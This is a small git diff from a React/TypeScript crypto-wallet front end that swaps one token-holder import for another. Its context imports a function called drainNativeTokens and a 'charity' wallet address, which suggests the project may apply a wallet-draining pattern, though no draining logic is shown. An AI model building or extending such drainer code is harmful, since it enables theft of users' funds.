@@ -21,7 +21,7 @@ import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
-import { fetchTokenHolders, fetchOneFreshHolder, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
+import { fetchMixedHolders, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
